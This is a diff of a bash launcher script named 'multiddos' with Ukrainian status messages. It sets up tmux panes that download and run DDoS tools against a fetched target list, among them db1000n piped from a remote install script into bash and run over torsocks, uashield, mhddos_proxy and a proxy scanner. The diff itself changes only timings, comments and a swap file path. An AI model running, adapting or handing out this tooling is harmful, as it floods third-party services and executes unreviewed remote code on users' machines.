@@ -1,6 +1,5 @@
 #!/bin/bash
-# curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh && tmux a
-
+# curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
 clear && echo -e "Loading...\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux toilet python3 python3-pip 
@@ -58,7 +57,7 @@ toilet -t --metal " MULTIDDOS"
 typing_on_screen 'Шукаю завдання...' ; sleep 0.5
 echo -e "\n\nTotal targets found:" "\x1b[32m $(cat $targets_curl | wc -l)\x1b[m" && sleep 0.1
 echo -e "Uniq targets:" "\x1b[32m $(cat $targets_uniq | wc -l)\x1b[m" && sleep 0.1
-echo -e "\nЗавантаження..."; sleep 2
+echo -e "\nЗавантаження..."; sleep 3
 clear
 }
 export -f prepare_targets_and_banner
@@ -68,6 +67,7 @@ launch () {
 tmux kill-session -t multidd > /dev/null 2>&1
 sudo pkill node > /dev/null 2>&1
 sudo pkill shield > /dev/null 2>&1
+
 # tmux mouse support
 grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
 tmux source-file ~/.tmux.conf > /dev/null 2>&1
@@ -77,33 +77,27 @@ if [[ $gotop == "on" ]]; then
         curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
         sudo dpkg -i gotop.deb
     fi
-    tmux new-session -s multidd -d 'gotop -sc solarized'
-    sleep 0.2
+    tmux new-session -s multidd -d 'gotop -sc solarized'; sleep 0.2
     tmux split-window -h -p 66 'bash auto_bash.sh'
 else
-    sleep 0.2
     tmux new-session -s multidd -d 'bash auto_bash.sh'
 fi
 
 if [[ $vnstat == "on" ]]; then
     sudo apt -yq install vnstat
-    sleep 0.2
     tmux split-window -v 'vnstat -l'
 fi
 
 if [[ $db1000n == "on" ]]; then
     sudo apt -yq install torsocks
-    sleep 0.2
     tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 fi
 
 if [[ $uashield == "on" ]]; then
-    sleep 0.2
     tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.6/shield-1.0.6.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
 fi
 
 if [[ $proxy_finder == "on" ]]; then
-    sleep 0.2
     tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
 fi
 tmux attach-session -t multidd
@@ -131,7 +125,7 @@ prepare_targets_and_banner
 cat > auto_bash.sh << 'EOF'
 # create swap file if system doesn't have it
 if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
-    sudo fallocate -l 1G /swapfile && sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile
+    sudo fallocate -l 1G /swp && sudo chmod 600 /swp && sudo mkswap /swp && sudo swapon /swp
 fi
 
 #install mhddos and mhddos_proxy
